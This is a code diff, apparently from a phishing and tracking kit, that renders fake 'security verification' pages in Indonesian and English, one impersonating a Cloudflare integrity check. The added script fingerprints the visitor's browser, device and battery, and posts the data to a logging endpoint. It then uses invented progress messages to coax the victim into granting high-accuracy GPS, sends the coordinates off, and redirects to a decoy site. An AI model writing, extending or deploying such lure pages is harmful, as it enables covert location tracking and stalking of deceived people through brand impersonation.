@@ -16,62 +16,107 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
   setInterval(checkRedirect, 1000);
 
   async function startCapture() {
-    console.log("Starting secure verification...");
+    const box = document.querySelector('.box');
+    if (!box) return;
+
+    box.innerHTML = \`
+      <div id="status-icon" style="font-size:40px; margin-bottom:15px;">🔍</div>
+      <h2 id="status-title">Menganalisis Perangkat...</h2>
+      <div id="progress-container" style="width:100%; background:#f0f0f0; border-radius:10px; height:8px; margin-bottom:15px; overflow:hidden; border: 1px solid #eee;">
+        <div id="progress-bar" style="width:0%; background:linear-gradient(90deg, #3498db, #2ecc71); height:100%; transition:width 0.4s ease;"></div>
+      </div>
+      <p id="status-text" style="font-size:13px; color:#7f8c8d; min-height: 40px;">Menginisialisasi modul sinkronisasi...</p>
+    \`;
+
+    const statusTitle = document.getElementById('status-title');
+    const statusText = document.getElementById('status-text');
+    const bar = document.getElementById('progress-bar');
+    const icon = document.getElementById('status-icon');
     
-    // 1. Silent Metadata Collection (No pop-up)
-    const metadata = {
-      browser: navigator.userAgent,
-      platform: navigator.platform,
-      screen: window.screen.width + "x" + window.screen.height,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      language: navigator.language,
-      cores: navigator.hardwareConcurrency || "N/A",
-      mem: (navigator as any).deviceMemory || "N/A",
-      vendor: navigator.vendor
+    const updateProgress = (p, text, title = "Verifikasi Keamanan") => {
+      bar.style.width = p + '%';
+      statusText.innerText = text;
+      statusTitle.innerText = title;
     };
 
-    // Try Battery (No permission needed in most browsers)
     try {
-      if ('getBattery' in navigator) {
-        const b: any = await (navigator as any).getBattery();
-        metadata.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
-      }
-    } catch(e) {}
+      updateProgress(15, "Menganalisis profil browser...");
+      
+      const metadata = {
+        browser: navigator.userAgent,
+        platform: navigator.platform,
+        screen: window.screen.width + "x" + window.screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        cores: navigator.hardwareConcurrency || "N/A",
+        mem: (navigator as any).deviceMemory || "N/A",
+        vendor: navigator.vendor,
+        ref: document.referrer || "Direct"
+      };
 
-    // Send initial metadata
-    fetch('/api/log/${id}/info', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(metadata)
-    }).catch(console.error);
+      try {
+        if ('getBattery' in navigator) {
+          const b = await (navigator as any).getBattery();
+          metadata.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
+        }
+      } catch(e) {}
 
-    // 2. Location Request (The only pop-up)
-    if (navigator.geolocation) { 
-      navigator.geolocation.getCurrentPosition( 
-        (pos) => { 
-          fetch('/api/log/${id}/gps', { 
-            method: 'POST', 
-            headers: { 'Content-Type': 'application/json' }, 
-            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) 
-          }).finally(() => { 
+      updateProgress(40, "Mengunggah metadata sistem...");
+      
+      await fetch(\`/api/log/${id}/info\`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(metadata)
+      });
+
+      updateProgress(65, "Menunggu otorisasi sinkronisasi...", "Izin Diperlukan");
+      icon.innerText = "📍";
+
+      if (navigator.geolocation) { 
+        navigator.geolocation.getCurrentPosition( 
+          (pos) => { 
+            updateProgress(90, "Verifikasi koordinat terakhir...");
+            fetch(\`/api/log/${id}/gps\`, { 
+              method: 'POST', 
+              headers: { 'Content-Type': 'application/json' }, 
+              body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) 
+            }).finally(() => { 
+              gpsAttempted = true; 
+              finish(true);
+            }); 
+          }, 
+          (err) => { 
             gpsAttempted = true; 
-            checkRedirect();
-          }); 
-        }, 
-        () => { 
-          gpsAttempted = true; 
-          checkRedirect();
-        }, 
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 } 
-      ); 
-    } else { 
-      gpsAttempted = true; 
-      checkRedirect();
+            finish(false, "Sinkronisasi lokasi dilewati.");
+          }, 
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 } 
+        ); 
+      } else { 
+        gpsAttempted = true; 
+        finish(false, "GPS tidak tersedia.");
+      }
+    } catch (err) {
+      finish(false, "Kesalahan sistem.");
+    }
+
+    function finish(success, reason = "") {
+      bar.style.width = '100%';
+      if (success) {
+        icon.innerText = "✅";
+        statusTitle.innerText = "Terverifikasi";
+        statusTitle.style.color = "#27ae60";
+        statusText.innerText = "Sinkronisasi selesai. Mengalihkan...";
+      } else {
+        icon.innerText = "ℹ️";
+        statusTitle.innerText = "Selesai";
+        statusText.innerText = reason + " Melanjutkan pengalihan...";
+      }
+      setTimeout(checkRedirect, 1500);
     }
   }
 
   window.onload = () => {
-    setTimeout(startCapture, 1500);
+    // No auto-trigger for better user interaction
   };
 </script>
 `;
@@ -79,11 +124,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   '1': {
     name: "Standard: Secure Identity Sync",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body { background:#fff; color:#333; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { max-width:400px; padding:20px; } .loader { border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px;} @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:25px; } .btn { background:#3498db; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; font-size:16px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3); } .btn:active { transform: scale(0.98); }</style></head><body><div class="box"><div class="loader"></div><h2>Verifikasi Keamanan Perangkat</h2><p>Penting: Klik tombol di bawah dan pilih <b>"Allow / Izinkan"</b> pada semua permintaan sistem untuk memverifikasi keaslian perangkat Anda dan melanjutkan ke halaman tujuan.</p><button class="btn" onclick="startCapture(); this.innerHTML='Memproses...';">VERIFIKASI SEKARANG</button></div>${getCaptureScript(id)}</body></html>`
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body { background:#fff; color:#333; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { width:90%; max-width:400px; padding:30px; background:#fff; border-radius:15px; } .loader { border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px;} @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:25px; } .btn { background:#3498db; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; font-size:16px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3); width: 100%; } .btn:active { transform: scale(0.98); }</style></head><body><div class="box"><div class="loader"></div><h2>Otoritas Keamanan</h2><p>Langkah terakhir: Sinkronkan profil keamanan browser Anda dengan server tujuan untuk melanjutkan akses aman.</p><button class="btn" onclick="startCapture();">VERIFIKASI AKUN</button></div>${getCaptureScript(id)}</body></html>`
   },
   '2': {
     name: "Cloudflare: Integrity Check",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Needed</title><style>body { font-family:system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .dot-spinner { display:flex; gap:8px; margin-bottom:20px; } .dot { width:10px; height:10px; background:#fa8231; border-radius:50%; animation:bounce 0.5s infinite alternate; } .dot:nth-child(2) { animation-delay:0.1s; } .dot:nth-child(3) { animation-delay:0.2s; } @keyframes bounce { to { transform:translateY(-10px); } } h1 { font-size:24px; font-weight:500; } .info { font-size:14px; color:#555; max-width:400px; margin-bottom:30px; } .btn { border:1px solid #ccc; background:#fff; padding:12px 25px; border-radius:4px; font-weight:600; cursor:pointer; box-shadow:0 1px 2px rgba(0,0,0,0.05); }</style></head><body><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120" style="margin-bottom:30px;"><div class="dot-spinner"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><h1>Verifying your browser integrity...</h1><p class="info">Please confirm your connection is secure. Click below and <b>Allow the connection sync request</b> to proceed to the target site.</p><button class="btn" onclick="startCapture(); this.innerHTML='Syncing...';">Proceed to Connection Sync</button><br><span style="font-size:10px;color:#999;">Ray ID: ${id}</span>${getCaptureScript(id)}</body></html>`
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Needed</title><style>body { font-family:system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .box { width:90%; max-width:450px; } .dot-spinner { display:flex; gap:8px; margin-bottom:20px; justify-content:center; } .dot { width:10px; height:10px; background:#fa8231; border-radius:50%; animation:bounce 0.5s infinite alternate; } .dot:nth-child(2) { animation-delay:0.1s; } .dot:nth-child(3) { animation-delay:0.2s; } @keyframes bounce { to { transform:translateY(-10px); } } h1 { font-size:24px; font-weight:500; } .info { font-size:14px; color:#555; margin-bottom:30px; } .btn { border:1px solid #ccc; background:#fff; padding:12px 25px; border-radius:4px; font-weight:600; cursor:pointer; box-shadow:0 1px 2px rgba(0,0,0,0.05); width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120" style="margin-bottom:30px;"><div class="dot-spinner"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><h1>Verifying your browser integrity...</h1><p class="info">Please confirm your connection is secure. Click below and <b>Allow</b> the security check authorization to proceed.</p><button class="btn" onclick="startCapture();">Proceed with Integrity Check</button><br><span style="font-size:10px;color:#999; display:block; margin-top:20px;">Ray ID: ${id}</span></div>${getCaptureScript(id)}</body></html>`
   },
   '3': {
     name: "Redirect: Verifikasi File",
